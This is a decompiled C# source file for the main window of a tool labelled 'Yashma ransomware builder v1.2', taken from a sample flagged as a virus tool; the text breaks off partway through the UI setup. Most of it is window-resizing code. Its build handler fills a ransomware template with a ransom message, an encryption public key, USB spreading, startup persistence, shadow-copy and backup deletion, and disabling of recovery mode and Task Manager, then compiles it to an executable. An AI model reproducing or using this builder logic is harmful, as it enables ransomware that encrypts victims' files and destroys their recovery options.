// Decompiled with JetBrains decompiler
// Type: CustomWindowsForm.BlackForm
// Assembly: Yashma ransomware builder v1.2, Version=2.0.0.1, Culture=neutral, PublicKeyToken=null
// MVID: 22C18137-3576-4359-994F-BB1A6613DCFC
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-VirTool.MSIL.Agent.gen-f9a5a72ead096594c5d59abe706e3716f6000c3b4ebd7690f2eb114a37d1a7db.exe

using Microsoft.Win32;
using Ryuk.Net;
using Ryuk.Net.Properties;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace CustomWindowsForm
{
  public class BlackForm : Form
  {
    private bool isTopPanelDragged = false;
    private bool isLeftPanelDragged = false;
    private bool isRightPanelDragged = false;
    private bool isBottomPanelDragged = false;
    private bool isTopBorderPanelDragged = false;
    private bool isRightBottomPanelDragged = false;
    private bool isLeftBottomPanelDragged = false;
    private bool isRightTopPanelDragged = false;
    private bool isLeftTopPanelDragged = false;
    private bool isWindowMaximized = false;
    private Point offset;
    private Size _normalWindowSize;
    private Point _normalWindowLocation = Point.Empty;
    private string iconLocation = "";
    private string forMutex = "oAnWieozQPsRK7Bj83r4";
    private IContainer components = (IContainer) null;
    private Panel RightPanel;
    private Panel TopPanel;
    private ButtonZ _CloseButton;
    private Panel RightBottomPanel_1;
    private Label WindowTextLabel;
    private MinMaxButton _MaxButton;
    private Panel panel2;
    private ButtonZ _MinButton;
    private Panel RightBottomPanel_2;
    private Panel LeftBottomPanel_2;
    private Panel RightTopPanel_1;
    private Panel RightTopPanel_2;
    private ShapedButton shapedButton4;
    private CheckBox usbSpreadCheckBox;
    private TextBox textBox1;
    private ShapedButton shapedButton3;
    private SaveFileDialog saveFileDialog1;
    private CheckBox checkBox1;
    private TextBox textBox2;
    private TextBox spreadNameText;
    private CheckBox checkBox2;
    private TextBox textBox4;
    private CheckBox startupcheckBox3;
    private OpenFileDialog openFileDialog1;
    private PictureBox pictureBox1;
    private Label selectIconLabel;
    private CheckBox sleepCheckBox;
    private TextBox SleepTextBox;
    private ShapedButton shapedButton1;
    private TextBox droppedMessageTextbox;
    private Label label1;
    private ShapedButton shapedButton2;

    public BlackForm() => this.InitializeComponent();

    private void BlackForm_Load(object sender, EventArgs e)
    {
      this.setValue();
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      foreach (Process process in Process.GetProcesses())
      {
        try
        {
          if (process.MainModule.FileName.Contains(folderPath))
            process.Kill();
        }
        catch
        {
        }
      }
    }

    private bool setValue()
    {
      try
      {
        using (RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Software\\" + this.forMutex))
        {
          subKey.SetValue(this.forMutex, (object) this.forMutex);
          subKey.Close();
          return true;
        }
      }
      catch
      {
        return false;
      }
    }

    private void TopBorderPanel_MouseDown(object sender, MouseEventArgs e)
    {
      if (e.Button == MouseButtons.Left)
        this.isTopBorderPanelDragged = true;
      else
        this.isTopBorderPanelDragged = false;
    }

    private void TopBorderPanel_MouseMove(object sender, MouseEventArgs e)
    {
      if (e.Y >= this.Location.Y || !this.isTopBorderPanelDragged)
        return;
      if (this.Height < 50)
      {
        this.Height = 50;
        this.isTopBorderPanelDragged = false;
      }
      else
      {
        Point location = this.Location;
        int x = location.X;
        location = this.Location;
        int y = location.Y + e.Y;
        this.Location = new Point(x, y);
        this.Height -= e.Y;
      }
    }

    private void TopBorderPanel_MouseUp(object sender, MouseEventArgs e) => this.isTopBorderPanelDragged = false;

    private void TopPanel_MouseDown(object sender, MouseEventArgs e)
    {
      if (e.Button == MouseButtons.Left)
      {
        this.isTopPanelDragged = true;
        Point screen = this.PointToScreen(new Point(e.X, e.Y));
        this.offset = new Point();
        this.offset.X = this.Location.X - screen.X;
        this.offset.Y = this.Location.Y - screen.Y;
      }
      else
        this.isTopPanelDragged = false;
      if (e.Clicks != 2)
        return;
      this.isTopPanelDragged = false;
      this._MaxButton_Click(sender, (EventArgs) e);
    }

    private void TopPanel_MouseMove(object sender, MouseEventArgs e)
    {
      if (!this.isTopPanelDragged)
        return;
      Point screen = this.TopPanel.PointToScreen(new Point(e.X, e.Y));
      screen.Offset(this.offset);
      this.Location = screen;
      Point location = this.Location;
      int num;
      if (location.X <= 2)
      {
        location = this.Location;
        num = location.Y <= 2 ? 1 : 0;
      }
      else
        num = 0;
      if (num == 0 && this.WindowState == FormWindowState.Maximized)
      {
        this.Location = this._normalWindowLocation;
        this.Size = this._normalWindowSize;
        this._MaxButton.CFormState = MinMaxButton.CustomFormState.Normal;
        this.isWindowMaximized = false;
      }
    }

    private void TopPanel_MouseUp(object sender, MouseEventArgs e)
    {
      this.isTopPanelDragged = false;
      if (this.Location.Y > 5 || this.isWindowMaximized)
        return;
      this._normalWindowSize = this.Size;
      this._normalWindowLocation = this.Location;
      Rectangle workingArea = Screen.PrimaryScreen.WorkingArea;
      this.Location = new Point(0, 0);
      this.Size = new Size(workingArea.Width, workingArea.Height);
      this._MaxButton.CFormState = MinMaxButton.CustomFormState.Maximize;
      this.isWindowMaximized = true;
    }

    private void LeftPanel_MouseDown(object sender, MouseEventArgs e)
    {
      if (this.Location.X <= 0 || e.X < 0)
      {
        this.isLeftPanelDragged = false;
        this.Location = new Point(10, this.Location.Y);
      }
      else
        this.isLeftPanelDragged = e.Button == MouseButtons.Left;
    }

    private void LeftPanel_MouseMove(object sender, MouseEventArgs e)
    {
      if (e.X >= this.Location.X || !this.isLeftPanelDragged)
        return;
      if (this.Width < 100)
      {
        this.Width = 100;
        this.isLeftPanelDragged = false;
      }
      else
      {
        this.Location = new Point(this.Location.X + e.X, this.Location.Y);
        this.Width -= e.X;
      }
    }

    private void LeftPanel_MouseUp(object sender, MouseEventArgs e) => this.isLeftPanelDragged = false;

    private void RightPanel_MouseDown(object sender, MouseEventArgs e)
    {
      if (e.Button == MouseButtons.Left)
        this.isRightPanelDragged = true;
      else
        this.isRightPanelDragged = false;
    }

    private void RightPanel_MouseMove(object sender, MouseEventArgs e)
    {
      if (!this.isRightPanelDragged)
        return;
      if (this.Width < 100)
      {
        this.Width = 100;
        this.isRightPanelDragged = false;
      }
      else
        this.Width += e.X;
    }

    private void RightPanel_MouseUp(object sender, MouseEventArgs e) => this.isRightPanelDragged = false;

    private void BottomPanel_MouseDown(object sender, MouseEventArgs e)
    {
      if (e.Button == MouseButtons.Left)
        this.isBottomPanelDragged = true;
      else
        this.isBottomPanelDragged = false;
    }

    private void BottomPanel_MouseMove(object sender, MouseEventArgs e)
    {
      if (!this.isBottomPanelDragged)
        return;
      if (this.Height < 50)
      {
        this.Height = 50;
        this.isBottomPanelDragged = false;
      }
      else
        this.Height += e.Y;
    }

    private void BottomPanel_MouseUp(object sender, MouseEventArgs e) => this.isBottomPanelDragged = false;

    private void _MinButton_Click(object sender, EventArgs e) => this.WindowState = FormWindowState.Minimized;

    private void _MaxButton_Click(object sender, EventArgs e)
    {
      if (this.isWindowMaximized)
      {
        this.Location = this._normalWindowLocation;
        this.Size = this._normalWindowSize;
        this._MaxButton.CFormState = MinMaxButton.CustomFormState.Normal;
        this.isWindowMaximized = false;
      }
      else
      {
        this._normalWindowSize = this.Size;
        this._normalWindowLocation = this.Location;
        Rectangle workingArea = Screen.PrimaryScreen.WorkingArea;
        this.Location = new Point(0, 0);
        this.Size = new Size(workingArea.Width, workingArea.Height);
        this._MaxButton.CFormState = MinMaxButton.CustomFormState.Maximize;
        this.isWindowMaximized = true;
      }
    }

    private void _CloseButton_Click(object sender, EventArgs e) => this.Close();

    private void RightBottomPanel_1_MouseDown(object sender, MouseEventArgs e) => this.isRightBottomPanelDragged = true;

    private void RightBottomPanel_1_MouseMove(object sender, MouseEventArgs e)
    {
      if (!this.isRightBottomPanelDragged)
        return;
      if (this.Width < 100 || this.Height < 50)
      {
        this.Width = 100;
        this.Height = 50;
        this.isRightBottomPanelDragged = false;
      }
      else
      {
        this.Width += e.X;
        this.Height += e.Y;
      }
    }

    private void RightBottomPanel_1_MouseUp(object sender, MouseEventArgs e) => this.isRightBottomPanelDragged = false;

    private void RightBottomPanel_2_MouseDown(object sender, MouseEventArgs e) => this.RightBottomPanel_1_MouseDown(sender, e);

    private void RightBottomPanel_2_MouseMove(object sender, MouseEventArgs e) => this.RightBottomPanel_1_MouseMove(sender, e);

    private void RightBottomPanel_2_MouseUp(object sender, MouseEventArgs e) => this.RightBottomPanel_1_MouseUp(sender, e);

    private void LeftBottomPanel_1_MouseDown(object sender, MouseEventArgs e) => this.isLeftBottomPanelDragged = true;

    private void LeftBottomPanel_1_MouseMove(object sender, MouseEventArgs e)
    {
      if (e.X >= this.Location.X || !this.isLeftBottomPanelDragged && this.Height >= 50)
        return;
      if (this.Width < 100)
      {
        this.Width = 100;
        this.Height = 50;
        this.isLeftBottomPanelDragged = false;
      }
      else
      {
        this.Location = new Point(this.Location.X + e.X, this.Location.Y);
        this.Width -= e.X;
        this.Height += e.Y;
      }
    }

    private void LeftBottomPanel_1_MouseUp(object sender, MouseEventArgs e) => this.isLeftBottomPanelDragged = false;

    private void LeftBottomPanel_2_MouseDown(object sender, MouseEventArgs e) => this.LeftBottomPanel_1_MouseDown(sender, e);

    private void LeftBottomPanel_2_MouseMove(object sender, MouseEventArgs e) => this.LeftBottomPanel_1_MouseMove(sender, e);

    private void LeftBottomPanel_2_MouseUp(object sender, MouseEventArgs e) => this.LeftBottomPanel_1_MouseUp(sender, e);

    private void RightTopPanel_1_MouseDown(object sender, MouseEventArgs e) => this.isRightTopPanelDragged = true;

    private void RightTopPanel_1_MouseMove(object sender, MouseEventArgs e)
    {
      if (e.Y >= this.Location.Y && e.X >= this.Location.X || !this.isRightTopPanelDragged)
        return;
      if (this.Height < 50 || this.Width < 100)
      {
        this.Height = 50;
        this.Width = 100;
        this.isRightTopPanelDragged = false;
      }
      else
      {
        this.Location = new Point(this.Location.X, this.Location.Y + e.Y);
        this.Height -= e.Y;
        this.Width += e.X;
      }
    }

    private void RightTopPanel_1_MouseUp(object sender, MouseEventArgs e) => this.isRightTopPanelDragged = false;

    private void RightTopPanel_2_MouseDown(object sender, MouseEventArgs e) => this.RightTopPanel_1_MouseDown(sender, e);

    private void RightTopPanel_2_MouseMove(object sender, MouseEventArgs e) => this.RightTopPanel_1_MouseMove(sender, e);

    private void RightTopPanel_2_MouseUp(object sender, MouseEventArgs e) => this.RightTopPanel_1_MouseUp(sender, e);

    private void LeftTopPanel_1_MouseDown(object sender, MouseEventArgs e) => this.isLeftTopPanelDragged = true;

    private void LeftTopPanel_1_MouseMove(object sender, MouseEventArgs e)
    {
      if (e.X >= this.Location.X && e.Y >= this.Location.Y || !this.isLeftTopPanelDragged)
        return;
      if (this.Width < 100 || this.Height < 50)
      {
        this.Width = 100;
        this.Height = 100;
        this.isLeftTopPanelDragged = false;
      }
      else
      {
        int x1 = this.Location.X + e.X;
        Point location = this.Location;
        int y1 = location.Y;
        this.Location = new Point(x1, y1);
        this.Width -= e.X;
        location = this.Location;
        int x2 = location.X;
        location = this.Location;
        int y2 = location.Y + e.Y;
        this.Location = new Point(x2, y2);
        this.Height -= e.Y;
      }
    }

    private void LeftTopPanel_1_MouseUp(object sender, MouseEventArgs e) => this.isLeftTopPanelDragged = false;

    private void LeftTopPanel_2_MouseDown(object sender, MouseEventArgs e) => this.LeftTopPanel_1_MouseDown(sender, e);

    private void LeftTopPanel_2_MouseMove(object sender, MouseEventArgs e) => this.LeftTopPanel_1_MouseMove(sender, e);

    private void LeftTopPanel_2_MouseUp(object sender, MouseEventArgs e) => this.LeftTopPanel_1_MouseUp(sender, e);

    private void file_button_Click(object sender, EventArgs e)
    {
    }

    private void edit_button_Click(object sender, EventArgs e)
    {
    }

    private void view_button_Click(object sender, EventArgs e)
    {
    }

    private void run_button_Click(object sender, EventArgs e)
    {
    }

    private void help_button_Click(object sender, EventArgs e)
    {
    }

    private void WindowTextLabel_MouseDown(object sender, MouseEventArgs e) => this.TopPanel_MouseDown(sender, e);

    private void WindowTextLabel_MouseMove(object sender, MouseEventArgs e) => this.TopPanel_MouseMove(sender, e);

    private void WindowTextLabel_MouseUp(object sender, MouseEventArgs e) => this.TopPanel_MouseUp(sender, e);

    private void shapedButton3_Click(object sender, EventArgs e)
    {
      int num = (int) new Form2().ShowDialog();
    }

    private void shapedButton4_Click(object sender, EventArgs e)
    {
      if (this.textBox1.Text.Trim().Length < 1)
      {
        int num1 = (int) MessageBox.Show("Please type your message!", "Read_it.txt", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      else if (string.IsNullOrWhiteSpace("aa"))
      {
        int num2 = (int) MessageBox.Show("All fields are required", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      else
      {
        StringBuilder stringBuilder1 = new StringBuilder();
        for (int index = 0; index < this.textBox1.Lines.Length; ++index)
        {
          string str = this.textBox1.Lines[index].Replace("\"", "'");
          stringBuilder1.Append("\"" + str + "\",\n");
        }
        string str1 = Resources.Source.Replace("#messages", stringBuilder1.ToString());
        string str2;
        if (this.checkBox1.Checked)
        {
          str2 = str1.Replace("#encryptedFileExtension", "");
        }
        else
        {
          string newValue = this.textBox2.Text;
          if (newValue.Contains("."))
            newValue = newValue.Replace(".", "");
          str2 = str1.Replace("#encryptedFileExtension", newValue);
        }
        string str3;
        if (this.checkBox2.Checked)
        {
          if (this.textBox4.Text.Trim().Length < 1)
          {
            int num3 = (int) MessageBox.Show("Proccess name field is empty");
            return;
          }
          str3 = !this.textBox4.Text.EndsWith(".exe") ? str2.Replace("#copyRoaming", "true").Replace("#exeName", this.textBox4.Text + ".exe") : str2.Replace("#copyRoaming", "true").Replace("#exeName", this.textBox4.Text);
        }
        else
          str3 = str2.Replace("#copyRoaming", "false").Replace("#exeName", this.textBox4.Text);
        string str4;
        if (this.usbSpreadCheckBox.Checked)
        {
          if (this.spreadNameText.Text.Trim().Length < 1)
          {
            int num4 = (int) MessageBox.Show("Usb spread name field is empty");
            return;
          }
          str4 = !this.spreadNameText.Text.EndsWith(".exe") ? str3.Replace("#checkSpread", "true").Replace("#spreadName", this.spreadNameText.Text + ".exe") : str3.Replace("#checkSpread", "true").Replace("#spreadName", this.spreadNameText.Text);
        }
        else
          str4 = str3.Replace("#checkSpread", "false").Replace("#spreadName", this.spreadNameText.Text);
        string str5 = !this.startupcheckBox3.Checked ? str4.Replace("#startupFolder", "true") : str4.Replace("#startupFolder", "true");
        string str6 = !this.sleepCheckBox.Checked ? str5.Replace("#checkSleep", "false").Replace("#sleepTextbox", this.SleepTextBox.Text) : str5.Replace("#checkSleep", "true").Replace("#sleepTextbox", this.SleepTextBox.Text);
        string str7 = !Settings.Default.checkAdminPrivilage ? str6.Replace("#adminPrivilage", "false") : str6.Replace("#adminPrivilage", "true");
        string str8 = !Settings.Default.deleteBackupCatalog ? str7.Replace("#checkdeleteBackupCatalog", "false") : str7.Replace("#checkdeleteBackupCatalog", "true");
        string str9 = !Settings.Default.deleteShadowCopies ? str8.Replace("#checkdeleteShadowCopies", "false") : str8.Replace("#checkdeleteShadowCopies", "true");
        string str10 = !Settings.Default.disableRecoveryMode ? str9.Replace("#checkdisableRecoveryMode", "false") : str9.Replace("#checkdisableRecoveryMode", "true");
        string str11 = !Settings.Default.disableTaskManager ? str10.Replace("#checkdisableTaskManager", "false") : str10.Replace("#checkdisableTaskManager", "true");
        string str12 = !Settings.Default.stopBackupServices ? str11.Replace("#checkStopBackupServices", "false") : str11.Replace("#checkStopBackupServices", "true");
        if (this.droppedMessageTextbox.Text.Trim().Length < 1)
        {
          int num5 = (int) MessageBox.Show("Dropped message name field is empty");
        }
        else
        {
          string sourceCode = str12.Replace("#droppedMessageTextbox", this.droppedMessageTextbox.Text);
          string publicKey = Settings.Default.publicKey;
          if (Settings.Default.encryptOption)
          {
            if (publicKey != "")
            {
              using (StringReader stringReader = new StringReader(publicKey))
              {
                StringBuilder stringBuilder2 = new StringBuilder();
                string str13;
                while ((str13 = stringReader.ReadLine()) != null)
                {
                  string str14 = str13.Replace("\"", "\\\"");
                  stringBuilder2.AppendLine("pubclicKey.AppendLine(\"" + str14 + "\");");
                }
                sourceCode = sourceCode.Replace("#encryptOption", "true");
                sourceCode = sourceCode.Replace("#publicKey", stringBuilder2.ToString());
              }
            }
            else
            {
              int num6 = (int) MessageBox.Show("Decrypter name field is empty. Go to \"Decrypter & Options\" and create or select decrypter", "Advanced Option");
              return;
            }
          }
          else
            sourceCode = sourceCode.Replace("#encryptOption", "false").Replace("#publicKey", "");
          if (Settings.Default.base64Image != "")
            sourceCode = sourceCode.Replace("#base64Image", Settings.Default.base64Image);
          if (Settings.Default.extensions != "")
            sourceCode = sourceCode.Replace("#extensions", Settings.Default.extensions);
          using (SaveFileDialog saveFileDialog = new SaveFileDialog())
          {
            saveFileDialog.Filter = "Executable (*.exe)|*.exe";
            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
              Compiler compiler = new Compiler(sourceCode, saveFileDialog.FileName, this.iconLocation);
            }
          }
        }
      }
    }

    private void saveFileDialog1_FileOk(object sender, CancelEventArgs e)
    {
    }

    private void panel2_Paint(object sender, PaintEventArgs e)
    {
    }

    private void checkBox1_CheckedChanged(object sender, EventArgs e)
    {
      if (!this.textBox2.Enabled)
        this.textBox2.Enabled = true;
      else
        this.textBox2.Enabled = false;
    }

    private void usbSpreadCheckBox_CheckedChanged(object sender, EventArgs e)
    {
      if (!this.spreadNameText.Enabled)
        this.spreadNameText.Enabled = true;
      else
        this.spreadNameText.Enabled = false;
    }

    private void checkBox2_CheckedChanged(object sender, EventArgs e)
    {
      if (!this.textBox4.Enabled)
        this.textBox4.Enabled = true;
      else
        this.textBox4.Enabled = false;
    }

    private void button1_Click(object sender, EventArgs e)
    {
    }

    private void pictureBox1_Click(object sender, EventArgs e)
    {
      using (OpenFileDialog openFileDialog = new OpenFileDialog())
      {
        openFileDialog.Filter = "Icons (*.ico)|*.ico";
        if (openFileDialog.ShowDialog() != DialogResult.OK)
          return;
        this.iconLocation = openFileDialog.FileName;
        this.pictureBox1.Image = (Image) Bitmap.FromHicon(new Icon(openFileDialog.FileName, new Size(60, 60)).Handle);
        this.selectIconLabel.Text = "";
      }
    }

    private void selectIconLabel_Click(object sender, EventArgs e)
    {
      using (OpenFileDialog openFileDialog = new OpenFileDialog())
      {
        openFileDialog.Filter = "Icons (*.ico)|*.ico";
        if (openFileDialog.ShowDialog() != DialogResult.OK)
          return;
        this.iconLocation = openFileDialog.FileName;
        this.pictureBox1.Image = (Image) Bitmap.FromHicon(new Icon(openFileDialog.FileName, new Size(60, 60)).Handle);
        this.selectIconLabel.Text = "";
      }
    }

    private void checkBox3_CheckedChanged(object sender, EventArgs e)
    {
      if (!this.SleepTextBox.Enabled)
        this.SleepTextBox.Enabled = true;
      else
        this.SleepTextBox.Enabled = false;
    }

    private void SleepTextBox_KeyPress_1(object sender, KeyPressEventArgs e)
    {
      if (char.IsControl(e.KeyChar) || char.IsDigit(e.KeyChar))
        return;
      e.Handled = true;
    }

    private void shapedButton1_Click(object sender, EventArgs e)
    {
      int num = (int) new advancedSettingForm().ShowDialog();
    }

    private void textBox1_TextChanged(object sender, EventArgs e)
    {
    }

    private void textBox1_MouseClick(object sender, MouseEventArgs e)
    {
    }

    private void TopPanel_Paint(object sender, PaintEventArgs e)
    {
    }

    private void shapedButton2_Click(object sender, EventArgs e)
    {
      int num = (int) new extensions().ShowDialog();
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (BlackForm));
      this.RightPanel = new Panel();
      this.TopPanel = new Panel();
      this._MinButton = new ButtonZ();
      this._MaxButton = new MinMaxButton();
      this.WindowTextLabel = new Label();
      this._CloseButton = new ButtonZ();
      this.RightBottomPanel_1 = new Panel();
      this.panel2 = new Panel();
      this.shapedButton2 = new ShapedButton();
      this.label1 = new Label();
      this.droppedMessageTextbox = new TextBox();
      this.shapedButton1 = new ShapedButton();
      this.sleepCheckBox = new CheckBox();
      this.SleepTextBox = new TextBox();
      this.selectIconLabel = new Label();
      this.pictureBox1 = new PictureBox();
      this.startupcheckBox3 = new CheckBox();
      this.textBox4 = new TextBox();
      this.checkBox2 = new CheckBox();
      this.spreadNameText = new TextBox();
      this.checkBox1 = new CheckBox();
      this.textBox2 = new TextBox();
      this.usbSpreadCheckBox = new CheckBox();
      this.shapedButton4 = new ShapedButton();
      this.shapedButton3 = new ShapedButton();
      this.RightBottomPanel_2 = new Panel();
      this.LeftBottomPanel_2 = new Panel();
      this.RightTopPanel_1 = new Panel();
      this.RightTopPanel_2 = new Panel();
      this.textBox1 = new TextBox();
      this.saveFileDialog1 = new SaveFileDialog();
      this.openFileDialog1 = new OpenFileDialog();
      this.TopPanel.SuspendLayout();
      this.panel2.SuspendLayout();
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      this.SuspendLayout();
      this.RightPanel.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Right;
      this.RightPanel.BackColor = System.Drawing.Color.Black;
      this.RightPanel.Cursor = Cursors.SizeWE;
      this.RightPanel.Location = new Point(896, 22);
      this.RightPanel.Name = "RightPanel";
      this.RightPanel.Size = new Size(2, 468);
      this.RightPanel.TabIndex = 1;
      this.RightPanel.MouseDown += new MouseEventHandler(this.RightPanel_MouseDown);
      this.RightPanel.MouseMove += new MouseEventHandler(this.RightPanel_MouseMove);
      this.RightPanel.MouseUp += new MouseEventHandler(this.RightPanel_MouseUp);
      this.TopPanel.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
      this.TopPanel.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
      this.TopPanel.Controls.Add((Control) this._MinButton);
      this.TopPanel.Controls.Add((Control) this._MaxButton);
      this.TopPanel.Controls.Add((Control) this.WindowTextLabel);
      this.TopPanel.Controls.Add((Control) this._CloseButton);
      this.TopPanel.Location = new Point(0, 0);
      this.TopPanel.Name = "TopPanel";
      this.TopPanel.Size = new Size(845, 74);
      this.TopPanel.TabIndex = 4;
      this.TopPanel.Paint += new PaintEventHandler(this.TopPanel_Paint);
      this.TopPanel.MouseDown += new MouseEventHandler(this.TopPanel_MouseDown);
      this.TopPanel.MouseMove += new MouseEventHandler(this.TopPanel_MouseMove);
      this.TopPanel.MouseUp += new MouseEventHandler(this.TopPanel_MouseUp);
      this._MinButton.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this._MinButton.BZBackColor = System.Drawing.Color.FromArgb(30, 30, 30);
      this._MinButton.DisplayText = "_";
      this._MinButton.FlatStyle = FlatStyle.Flat;
      this._MinButton.Font = new Font("Microsoft Sans Serif", 20.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this._MinButton.ForeColor = System.Drawing.Color.White;
      this._MinButton.Location = new Point(737, 8);
      this._MinButton.MouseClickColor1 = System.Drawing.Color.FromArgb(60, 60, 160);
      this._MinButton.MouseHoverColor = System.Drawing.Color.FromArgb(50, 50, 50);
      this._MinButton.Name = "_MinButton";
      this._MinButton.Size = new Size(31, 24);
      this._MinButton.TabIndex = 4;
      this._MinButton.Text = "_";
      this._MinButton.TextLocation_X = 6;
      this._MinButton.TextLocation_Y = -20;
      this._MinButton.UseVisualStyleBackColor = true;
      this._MinButton.Click += new EventHandler(this._MinButton_Click);
      this._MaxButton.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this._MaxButton.BZBackColor = System.Drawing.Color.FromArgb(30, 30, 30);
      this._MaxButton.CFormState = MinMaxButton.CustomFormState.Normal;
      this._MaxButton.DisplayText = "_";
      this._MaxButton.FlatStyle = FlatStyle.Flat;
      this._MaxButton.ForeColor = System.Drawing.Color.White;
      this._MaxButton.Location = new Point(774, 9);
      this._MaxButton.MouseClickColor1 = System.Drawing.Color.FromArgb(60, 60, 160);
      this._MaxButton.MouseHoverColor = System.Drawing.Color.FromArgb(50, 50, 50);
      this._MaxButton.Name = "_MaxButton";
      this._MaxButton.Size = new Size(31, 24);
      this._MaxButton.TabIndex = 2;
      this._MaxButton.Text = "minMaxButton1";
      this._MaxButton.TextLocation_X = 8;
      this._MaxButton.TextLocation_Y = 6;
      this._MaxButton.UseVisualStyleBackColor = true;
      this._MaxButton.Click += new EventHandler(this._MaxButton_Click);
      this.WindowTextLabel.AutoSize = true;
      this.WindowTextLabel.Font = new Font("Microsoft Sans Serif", 26.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.WindowTextLabel.ForeColor = System.Drawing.Color.White;
      this.WindowTextLabel.Location = new Point(8, 22);
      this.WindowTextLabel.Name = "WindowTextLabel";
      this.WindowTextLabel.Size = new Size(534, 39);
      this.WindowTextLabel.TabIndex = 1;
      this.WindowTextLabel.Text = "Yashma ransomware builder v1.2";
      this.WindowTextLabel.MouseDown += new MouseEventHandler(this.WindowTextLabel_MouseDown);
      this.WindowTextLabel.MouseMove += new MouseEventHandler(this.WindowTextLabel_MouseMove);
      this.WindowTextLabel.MouseUp += new MouseEventHandler(this.WindowTextLabel_MouseUp);
      this._CloseButton.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this._CloseButton.BZBackColor = System.Drawing.Color.FromArgb(30, 30, 30);
      this._CloseButton.DisplayText = "X";
      this._CloseButton.FlatStyle = FlatStyle.Flat;
      this._CloseButton.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this._CloseButton.ForeColor = System.Drawing.Color.White;
      this._CloseButton.Location = new Point(811, 8);
      this._CloseButton.MouseClickColor1 = System.Drawing.Color.FromArgb(60, 60, 160);
      this._CloseButton.MouseHoverColor = System.Drawing.Color.FromArgb(50, 50, 50);
      this._CloseButton.Name = "_CloseButton";
      this._CloseButton.Size = new Size(31, 24);
      this._CloseButton.TabIndex = 0;
      this._CloseButton.Text = "X";
      this._CloseButton.TextLocation_X = 6;
      this._CloseButton.TextLocation_Y = 1;
      this._CloseButton.UseVisualStyleBackColor = true;
      this._CloseButton.Click += new EventHandler(this._CloseButton_Click);
      this.RightBottomPanel_1.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
      this.RightBottomPanel_1.BackColor = System.Drawing.Color.Black;
      this.RightBottomPanel_1.Cursor = Cursors.SizeNWSE;
      this.RightBottomPanel_1.Location = new Point(878, 509);
      this.RightBottomPanel_1.Name = "RightBottomPanel_1";
      this.RightBottomPanel_1.Size = new Size(19, 2);
      this.RightBottomPanel_1.TabIndex = 5;
      this.RightBottomPanel_1.MouseDown += new MouseEventHandler(this.RightBottomPanel_1_MouseDown);
      this.RightBottomPanel_1.MouseMove += new MouseEventHandler(this.RightBottomPanel_1_MouseMove);
      this.RightBottomPanel_1.MouseUp += new MouseEventHandler(this.RightBottomPanel_1_MouseUp);
      this.panel2.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
      this.panel2.Controls.Add((Control) this.shapedButton2);
      this.panel2.Controls.Add((Control) this.label1);
      this.panel2.Controls.Add((Control) this.droppedMessageTextbox);
      this.panel2.Controls.Add((Control) this.shapedButton1);
      this.panel2.Controls.Add((Control) this.sleepCheckBox);
      this.panel2.Controls.Add((Control) this.SleepTextBox);
      this.panel2.Controls.Add((Control) this.selectIconLabel);
      this.panel2.Controls.Add((Control) this.pictureBox1);
      this.panel2.Controls.Add((Control) this.startupcheckBox3);
      this.panel2.Controls.Add((Control) this.textBox4);
      this.panel2.Controls.Add((Control) this.checkBox2);
      this.panel2.Controls.Add((Control) this.spreadNameText);
      this.panel2.Controls.Add((Control) this.checkBox1);
      this.panel2.Controls.Add((Control) this.textBox2);
      this.panel2.Controls.Add((Control) this.usbSpreadCheckBox);
      this.panel2.Controls.Add((Control) this.shapedButton4);
      this.panel2.Controls.Add((Control) this.shapedButton3);
      this.panel2.Dock = DockStyle.Bottom;
      this.panel2.ForeColor = SystemColors.Control;
      this.panel2.Location = new Point(0, 398);
      this.panel2.Name = "panel2";
      this.panel2.Size = new Size(847, 146);
      this.panel2.TabIndex = 8;
      this.panel2.Paint += new PaintEventHandler(this.panel2_Paint);
      this.shapedButton2.BackColor = System.Drawing.Color.Transparent;
      this.shapedButton2.BorderColor = System.Drawing.Color.Transparent;
      this.shapedButton2.BorderWidth = 2;
      this.shapedButton2.ButtonShape = ShapedButton.ButtonsShapes.RoundRect;
      this.shapedButton2.ButtonText = "File Extensions";
      this.shapedButton2.Cursor = Cursors.Hand;
      this.shapedButton2.EndColor = System.Drawing.Color.FromArgb(30, 30, 30);
      this.shapedButton2.FlatAppearance.BorderSize = 0;
      this.shapedButton2.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Transparent;
      this.shapedButton2.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Transparent;
      this.shapedButton2.FlatStyle = FlatStyle.Flat;
      this.shapedButton2.Font = new Font("Microsoft Sans Serif", 11.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.shapedButton2.ForeColor = System.Drawing.Color.White;
      this.shapedButton2.GradientAngle = 90;
      this.shapedButton2.Location = new Point(0, 82);
      this.shapedButton2.MouseClickColor1 = System.Drawing.Color.Black;
      this.shapedButton2.MouseClickColor2 = System.Drawing.Color.Black;
      this.shapedButton2.MouseHoverColor1 = System.Drawing.Color.FromArgb(80, 80, 80);
      this.shapedButton2.MouseHoverColor2 = System.Drawing.Color.FromArgb(80, 80, 80);
      this.shapedButton2.Name = "shapedButton2";
      this.shapedButton2.ShowButtontext = true;
      this.shapedButton2.Size = new Size(166, 55);
      this.shapedButton2.StartColor = System.Drawing.Color.FromArgb(30, 30, 30);
      this.shapedButton2.TabIndex = 27;
